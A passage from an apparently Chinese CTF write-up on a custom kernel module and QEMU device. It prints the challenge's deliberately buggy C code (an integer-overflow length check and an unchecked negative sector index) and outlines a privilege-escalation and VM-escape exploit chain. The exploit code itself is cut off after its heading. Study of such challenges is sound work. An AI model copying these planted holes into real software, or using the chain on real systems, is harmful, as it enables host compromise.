UAF 修改其为一个较大的值，那么我们就可以让内核模块认为该 buffer 依然有可以写入的空间，从而完成越界写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_queue_last_empty</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bytedev *dev)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br><br>    <span class="hljs-keyword">if</span> (!dev-&gt;data_queue[idx]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* there&#x27;s where we made our expand bug: integer overflow */</span><br>    <span class="hljs-keyword">return</span> (BYTEDEV_BUF_SIZE - dev-&gt;data_queue[idx]-&gt;len) &gt; <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* the correct version */</span><br>    <span class="hljs-comment">//return dev-&gt;data_queue[idx]-&gt;len &lt; BYTEDEV_BUF_SIZE;</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> wlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br>        <span class="hljs-type">int</span> d_idx;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already full,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>            ret = wlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Fill the unused part of last buffer.</span><br><span class="hljs-comment">         * We mainly fill the data that is less than BYTEDEV_BUF_SIZE there.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_last_empty(dev)) &#123;<br>            <span class="hljs-type">int</span> d_idx = <br>                    (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span> =</span> dev-&gt;data_queue[d_idx];<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left = BYTEDEV_BUF_SIZE - d-&gt;len;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clen = left &gt; size ? size : left;<br><br>            ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>            <span class="hljs-keyword">if</span> (ret) &#123;<br>                printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br><br>            size -= clen;<br>            d-&gt;len += clen;<br>            wlen += clen;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * When we arrive at there, it means that there&#x27;s no space left</span><br><span class="hljs-comment">         * on the tail buffer, so we alloc a new buffer there.</span><br><span class="hljs-comment">         */</span><br>        d_idx = dev-&gt;tail_idx;<br>        dev-&gt;data_queue[d_idx] = <br>                    kmalloc(BYTEDEV_BUF_SIZE + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data), <br>                            GFP_KERNEL_ACCOUNT);<br>        dev-&gt;tail_idx++;<br>        dev-&gt;tail_idx %= BYTEDEV_MAX_BUFS;<br><br>        d = dev-&gt;data_queue[d_idx];<br>        d-&gt;len = <span class="hljs-number">0</span>;<br>        d-&gt;offset = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Copy the data there */</span><br>        left = BYTEDEV_BUF_SIZE;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;len += clen;<br>        wlen += clen;<br>    &#125;<br><br>    ret = wlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、QEMU-设备部分"><a href="#二、QEMU-设备部分" class="headerlink" title="二、QEMU 设备部分"></a>二、QEMU 设备部分</h2><p>第二阶段则是对设备 block 模式下的应用，这里 QEMU 模拟了一个类似于硬盘的设备，我们可以读写指定的扇区（大小为 512 字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevRegs</span> &#123;</span><br>    <span class="hljs-type">int</span> mode;<br>    <span class="hljs-type">int</span> blk_idx;<br>    <span class="hljs-type">int</span> blk_status;<br>&#125; BYTEPCIDevRegs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    BYTEPCIDevRegs regs;<br><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br><br>    <span class="hljs-type">char</span> *blk_mem[BYTEDEV_SECTOR_NUM];<br>&#125; BYTEPCIDevState;<br></code></pre></td></tr></table></figure><p>其中我们使用 PMIO 来实现设备模式的获取与切换、扇区的切换，使用 MMIO 来实现对特定扇区的读写，而漏洞便出在扇区的切换上，虽然设备里有一个后向的扇区索引越界检查，但是存储当前扇区索引所使用的为 int 类型的变量，<strong>而设备代码中并没有对索引为负数的情况进行检查</strong>，因此我们可以进行前向的越界操作，若是在低地址处存在可利用的指针则可以直接完成越界的读写操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">byte_dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    BYTEPCIDevState *ds = BYTEDEV_PCI(opaque);<br>    <span class="hljs-type">int</span> op_idx = val;<br><br>    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    smp_mb();<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_MODE:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_BLK:<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_STREAM:<br>                    ds-&gt;regs.mode = val;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_BLK_IDX:<br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.blk_status == BYTEDEV_BLK_STATUS_BUSY) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.mode != BYTEDEV_MODE_BLK) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-comment">/** </span><br><span class="hljs-comment">             * There&#x27;s where we made our basic bug: OOB rw forward </span><br><span class="hljs-comment">             * Because there&#x27;s no check for minus idx there.</span><br><span class="hljs-comment">             * */</span><br>            <span class="hljs-keyword">if</span> (op_idx &gt;= BYTEDEV_SECTOR_NUM) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            ds-&gt;regs.blk_idx = op_idx;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_BUSY;<br>            <span class="hljs-keyword">if</span> (!ds-&gt;blk_mem[ds-&gt;regs.blk_idx]) &#123;<br>                ds-&gt;blk_mem[ds-&gt;regs.blk_idx] = g_malloc(BYTEDEV_SECTOR_SIZE);<br>            &#125;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_READY;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>漏洞的利用存在两个阶段：第一阶段是利用内核模块中流模式存在的漏洞完成提权，第二阶段则是利用模拟设备中存在的漏洞完成虚拟化逃逸</p><h2 id="Stage-I-kernel-primitive"><a href="#Stage-I-kernel-primitive" class="headerlink" title="Stage.I - kernel primitive"></a>Stage.I - kernel primitive</h2><p>由于我们直接有 UAF 和越界读写，那么第一阶段的解题思路就比较清晰了，我们可以先写入一个 buffer 后读取出该 buffer 制造出 UAF，之后利用其他结构体改写其数据统计字段，之后再通过越界写进行提权，需要注意的是由于开启了 hardened usercopy 检查，我们需要直接在下一个 object 中进行数据写入，而不能进行跨 object 的数据拷贝</p><p>由于分配 buffer 所用的 flag 为 GFP_KERNEL_ACCOUNT，因此最后的提权解法直接套用 CVE-2021-22555 的堆喷 msg_msg + sk_buff 的模板即可</p><h2 id="Stage-II-QEMU-escape"><a href="#Stage-II-QEMU-escape" class="headerlink" title="Stage.II - QEMU escape"></a>Stage.II - QEMU escape</h2><p>由于读写过程为通过对应索引的指针完成读写，因此我们需要向前寻找指向合适区域的指针来实现利用，万幸的是我们前向可读的区域中有 MemoryRegion，还有设备结构体的父类 PCIDevice ：</p><p>利用 MemoryRegion 我们可以泄露出设备自身结构体的地址并读写开头的 512 字节，我们可以在其 io_regions 中的空闲字段构造 ROP 或是一些其他东西</p><p>对于 PCIDevice 我们可以利用最上层的父类 Object 的 properties 成员泄露出 glib 的基地址，从而泄露出 glibc 的基地址（其加载地址间偏移固定）；同时我们还能通过其 io_regions 字段完成对 MemoryRegion 的读写</p><p>那么整个利用思路就非常清晰了：我们先前向读取 properties 泄露出 libc，之后读取 MemoryRegion 泄露出设备结构体地址，在 PCIDevice.io_regions 上构造 fake MemoryRegionOps 后劫持 PMIO 的 MemoryRegion 的 ops 从而完成虚拟机逃逸</p><h2 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h2><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span 